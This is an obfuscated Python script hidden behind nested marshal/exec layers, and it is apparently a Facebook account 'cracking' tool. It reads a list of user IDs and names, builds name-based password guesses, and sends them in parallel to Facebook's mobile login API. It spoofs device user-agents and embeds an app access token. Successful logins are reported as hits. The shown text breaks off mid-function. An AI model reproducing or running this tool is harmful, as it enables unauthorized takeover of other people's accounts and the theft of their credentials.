#Enc > Rana Aahil
import marshal
exec(marshal.loads(b'\xe1\x176\x00\x00#Enc > Rana Aahil\nimport marshal\nexec(marshal.loads(b\'\\xe1\\\\*\\x00\\x00#Enc > Rana Aahil\\nimport marshal\\nexec(marshal.loads(b\\\'\\\\xe1^$\\\\x00\\\\x00#Enc > Rana Aahil\\\\nimport marshal\\\\nexec(marshal.loads(b\\\\\\\'\\\\\\\\xe1>!\\\\\\\\x00\\\\\\\\x00#Enc > Rana Aahil\\\\\\\\nimport marshal\\\\\\\\nexec(marshal.loads(b\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\xe1:\\\\\\\\\\\\\\\\x1f\\\\\\\\\\\\\\\\x00\\\\\\\\\\\\\\\\x00import requests,os,json,sys,random,uuid,re\\\\\\\\\\\\\\\\nfrom concurrent.futures import ThreadPoolExecutor as lol\\\\\\\\\\\\\\\\nfrom requests.exceptions import ConnectionError as CError\\\\\\\\\\\\\\\\nfrom bs4 import BeautifulSoup as parser\\\\\\\\\\\\\\\\nteer = ("|");idx = [];loop = 0;take_file = []\\\\\\\\\\\\\\\\nnew_file = [];passwords = [];proxer = [];oku = []\\\\\\\\\\\\\\\\nimport string,uuid,json,subprocess\\\\\\\\\\\\\\\\ncpu = [];tfu = []\\\\\\\\\\\\\\\\nG=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\x1b[1;92m\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\nR=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\x1b[1;91m\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\nW=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\x1b[1;97m\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\nS =\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\x1b[1;96m\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\nY =\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\x1b[1;93m\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\nyp =\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\x1b[1;95m\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\nC = \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\x1b[0m\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' \\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n################################################################\\\\\\\\\\\\\\\\n"""\\\\\\\\\\\\\\\\n                           GET INFO              """\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n################################################################\\\\\\\\\\\\\\\\ntry:\\\\\\\\\\\\\\\\n    mod___ = subprocess.check_output(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'getprop ro.product.product.model\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', shell=True).decode("utf-8").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n","").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'b","")\\\\\\\\\\\\\\\\n    _model_name_ = str(mod___)\\\\\\\\\\\\\\\\nexcept:\\\\\\\\\\\\\\\\n    _model_name_ = ("Infinix X689B")\\\\\\\\\\\\\\\\ntry:\\\\\\\\\\\\\\\\n    brand__ = subprocess.check_output(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'getprop ro.product.odm.brand\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', shell=True).decode("utf-8").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n","").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'b","")\\\\\\\\\\\\\\\\n    mobile_name = str(brand__).lower()\\\\\\\\\\\\\\\\nexcept:\\\\\\\\\\\\\\\\n    mobile_name = ("infinix")\\\\\\\\\\\\\\\\ntry:\\\\\\\\\\\\\\\\n    arm__ = subprocess.check_output(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'getprop ro.product.cpu.abi\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', shell=True).decode("utf-8").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n","").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'b","")\\\\\\\\\\\\\\\\n    arm_version = str(arm__)\\\\\\\\\\\\\\\\nexcept:\\\\\\\\\\\\\\\\n    arm_version = ("arm64-v8a")\\\\\\\\\\\\\\\\ntry:\\\\\\\\\\\\\\\\n    den__ = subprocess.check_output(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'getprop ro.sf.lcd_density\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', shell=True).decode("utf-8").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n","").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'b","")\\\\\\\\\\\\\\\\n    den_t = str(den__)\\\\\\\\\\\\\\\\n    if den_t == \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\':\\\\\\\\\\\\\\\\n        den_t = ("320")\\\\\\\\\\\\\\\\n    elif den_t == \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\':\\\\\\\\\\\\\\\\n        den_t = ("320")\\\\\\\\\\\\\\\\n    else:\\\\\\\\\\\\\\\\n        pass\\\\\\\\\\\\\\\\nexcept:\\\\\\\\\\\\\\\\n    den_t = ("320")\\\\\\\\\\\\\\\\ntry:\\\\\\\\\\\\\\\\n    wid__ = subprocess.check_output(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'getprop sys.logical.width\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', shell=True).decode("utf-8").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n","").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'b","")\\\\\\\\\\\\\\\\n    _wid_ = str(wid__)\\\\\\\\\\\\\\\\n    if _wid_ == \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\':\\\\\\\\\\\\\\\\n        _wid_ = ("720")\\\\\\\\\\\\\\\\n    elif _wid_ == \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\':\\\\\\\\\\\\\\\\n        _wid_ = ("720")\\\\\\\\\\\\\\\\n    else:\\\\\\\\\\\\\\\\n        pass\\\\\\\\\\\\\\\\nexcept:\\\\\\\\\\\\\\\\n    _wid_ = ("720")\\\\\\\\\\\\\\\\ntry:\\\\\\\\\\\\\\\\n    hei__ = subprocess.check_output(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'getprop sys.logical.height\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', shell=True).decode("utf-8").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n","").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'b","")\\\\\\\\\\\\\\\\n    _hei_ = str(hei__)\\\\\\\\\\\\\\\\n    if _hei_ == \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\':\\\\\\\\\\\\\\\\n        _hei_ = ("1640")\\\\\\\\\\\\\\\\n    elif _hei_ == \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\':\\\\\\\\\\\\\\\\n        _hei_ = ("1640")\\\\\\\\\\\\\\\\n    else:\\\\\\\\\\\\\\\\n        pass\\\\\\\\\\\\\\\\nexcept:\\\\\\\\\\\\\\\\n    _hei_ = ("1640")\\\\\\\\\\\\\\\\ntok_denty = str(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'density={},width={},height={}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'.format(den_t,_wid_,_hei_))\\\\\\\\\\\\\\\\nd_ = (\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'{\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'+str(tok_denty)+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\ntry:\\\\\\\\\\\\\\\\n    build__= subprocess.check_output(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'getprop persist.sys.ota_version\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', shell=True).decode("utf-8").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n","").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'b","")\\\\\\\\\\\\\\\\n    build_num_f = str(build__)\\\\\\\\\\\\\\\\n    if build_num_f == \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\':\\\\\\\\\\\\\\\\n        build_num_f = str(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'PPPP-H696JKM-R-GL-2204\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\n    else:\\\\\\\\\\\\\\\\n        pass\\\\\\\\\\\\\\\\nexcept:\\\\\\\\\\\\\\\\n    build_num_f = str(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'PPPP-H696JKM-R-GL-2204\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\ntry:\\\\\\\\\\\\\\\\n    FBCR__= subprocess.check_output(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'getprop ro.product.manufacturer\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', shell=True).decode("utf-8").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n","").replace("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'b","")\\\\\\\\\\\\\\\\n    fbcr_m = str(FBCR__)\\\\\\\\\\\\\\\\nexcept:\\\\\\\\\\\\\\\\n    fbcr_m = str(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'INFINIX MOBILITY LIMITED\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\nimport platform\\\\\\\\\\\\\\\\nxcx = platform.platform()[::-1].replace(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'-\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',"")\\\\\\\\\\\\\\\\nphone_module = (xcx[15:][:5]).upper()\\\\\\\\\\\\\\\\n################################################################\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\nidx = []\\\\\\\\\\\\\\\\np_ = [\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'first last\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'First Last\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'firstlast\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'first123\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'first1234\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'first12345\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'first786\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\']\\\\\\\\\\\\\\\\noku = []\\\\\\\\\\\\\\\\ncpu = []\\\\\\\\\\\\\\\\nloop = 1\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\ndef menu():\\\\\\\\\\\\\\\\n    os.system(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'clear\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\n    file = input("file: ")\\\\\\\\\\\\\\\\n    for x in open(file,\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'r\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\').readlines():\\\\\\\\\\\\\\\\n        idx.append(x.strip())\\\\\\\\\\\\\\\\n    print(" updated api")\\\\\\\\\\\\\\\\n    print(47*\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'-\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\n    print(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\t wait we are cracking ids .....\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\n    print(47*\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'-\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\n    with lol (max_workers=30) as send:\\\\\\\\\\\\\\\\n        for ids in idx:\\\\\\\\\\\\\\\\n            uid , nam = ids.rsplit("|")\\\\\\\\\\\\\\\\n            f = nam.rsplit(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')[0]\\\\\\\\\\\\\\\\n            try:\\\\\\\\\\\\\\\\n                l = nam.rsplit(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')[0]\\\\\\\\\\\\\\\\n            except(IOError,OSError,KeyError):\\\\\\\\\\\\\\\\n                l = f\\\\\\\\\\\\\\\\n            f = f.lower()\\\\\\\\\\\\\\\\n            l = l.lower()\\\\\\\\\\\\\\\\n            send.submit(check, uid,f,l)\\\\\\\\\\\\\\\\n    print(47*\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'-\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\n    print(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'cloning end use python filecloner.py relogin\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\n    print(47*\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'-\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\n    exit()\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\ndef check(uid,f,l):\\\\\\\\\\\\\\\\n    global loop,cpu,oku\\\\\\\\\\\\\\\\n    sys.stdout.write(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'{}  [ {}/{} ] OK:{}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\r\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'.format(C, str(loop), str(len(idx)), str(len(oku))))\\\\\\\\\\\\\\\\n    ses = requests.Session()\\\\\\\\\\\\\\\\n    url = uid#"mbasic.facebook.com"\\\\\\\\\\\\\\\\n    for pw in p_:\\\\\\\\\\\\\\\\n        try:\\\\\\\\\\\\\\\\n            pw = pw.replace(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'first\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',f).replace(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'last\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',l).replace(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'First\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',f.capitalize()).replace(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'Last\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',l.capitalize())\\\\\\\\\\\\\\\\n            print(pw)\\\\\\\\\\\\\\\\n            android_version = str(random.randint(4,11))+str(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'.0.0\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\n            dot = str(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'.\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\n            fbav = str(random.randint(111,111))+dot+str(random.randint(111,999))+dot+str(random.randint(111,999))+dot+str(random.randint(111,999))\\\\\\\\\\\\\\\\n            fbbv = str(random.randint(111111111,999999999))\\\\\\\\\\\\\\\\n            fbrv = str(random.randint(1111111,9999999))\\\\\\\\\\\\\\\\n            build_o = str("".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(25,35)))).lower()\\\\\\\\\\\\\\\\n            #ua_ = f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'Davik/2.1.0 (Linux; U; Android {android_version}; {_model_name_} Build/{build_num_f}) [FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{d_};FBLC/en_GB;FBRV/{fbrv};FBCR/Zong;FBMF/{fbcr_m};FBBD/{mobile_name};FBPN/com.facebook.katana;FBDV/{_model_name_};FBSV/{str(random.randint(1,9))};FBOP/{str(random.randint(1,9))};FBCA/{arm_version};]\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\n            build__ =(f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'{str(random.randint(11,99))}.1.A.0.{str(random.randint(111,999))})\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\n            mobile_brands = random.choice([\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'vivo\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'samsung\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'realme\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'matrola\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'nokia\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'])\\\\\\\\\\\\\\\\n            ua_ = f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'Davik/2.1.0 (Linux; U; Android {android_version}; {_model_name_} Build/RP1A.200720.011) [FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{d_};FBLC/en_GB;FBRV/{fbrv};FBCR/Zong;FBMF/{fbcr_m};FBBD/{mobile_name};FBPN/com.facebook.katana;FBDV/{_model_name_};FBSV/11;FBOP/19;FBCA/arm64-v8a:armeabi-v7a:armeabi;]\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\n            data = {\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'adid\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': str("".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(25,35)))).lower(), \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'format\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'json\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'device_id\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': str("".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(25,35)))).lower(), \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'cpl\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'true\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'family_device_id\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': str("".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(25,35)))).lower(), \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'credentials_type\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'device_based_login_password\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'error_detail_type\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'button_with_disabled\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'source\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'device_based_login\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'email\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': url, \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'password\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': pw, \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'access_token\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'350685531728|62f8ce9f74b12f84c123cc23437a4a32\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'generate_session_cookies\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'1\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'meta_inf_fbmeta\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'advertiser_id\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': str("".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(25,35)))).lower(), \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'currently_logged_in_userid\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'0\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'locale\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'en_US\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'client_country_code\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'US\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'method\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'auth.login\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'fb_api_req_friendly_name\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'authenticate\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'fb_api_caller_class\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'com.facebook.account.login.protocol.Fb4aAuthHandler\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'api_key\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'882a8490361da98702bf97a021ddc14d\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'}\\\\\\\\\\\\\\\\n            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])\\\\\\\\\\\\\\\\n            head = {\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'Accept\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'*/*\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'Connection\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'keep-alive\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'Authorization\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'Host\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'b-graph.facebook.com\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'X-FB-Connection-Bandwidth\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': str(random.randint(20000000, 40000000)), \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'X-FB-Net-HNI\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': str(random.randint(20000, 40000)), \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'X-FB-SIM-HNI\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': str(random.randint(20000, 40000)), \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'X-FB-Connection-Quality\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'EXCELLENT\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'X-FB-Connection-Type\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'WIFI.LTE\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'X-Tigon-Is-Retry\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'False\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'User-Agent\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': ua_, \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'Accept-Encoding\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'gzip, deflate\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'Content-Type\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'application/x-www-form-urlencoded\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'X-FB-HTTP-Engine\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'Liger\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\', \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'Content-Length\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\': str(len(content_lenght))}\\\\\\\\\\\\\\\\n            r = ses.post("https://b-graph.facebook.com/auth/login",data=data,headers=head)\\\\\\\\\\\\\\\\n            q = json.loads(r.text)\\\\\\\\\\\\\\\\n            if \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'session_key\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' in q:\\\\\\\\\\\\\\\\n                print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\r {} [Mr-saifii-ok] {} {} {} {}".format(G,url,teer,pw,C))\\\\\\\\\\\\\\\\n                oku.append(url)\\\\\\\\\\\\\\\\n                break\\\\\\\\\\\\\\\\n            elif \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'www.facebook.com\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' in 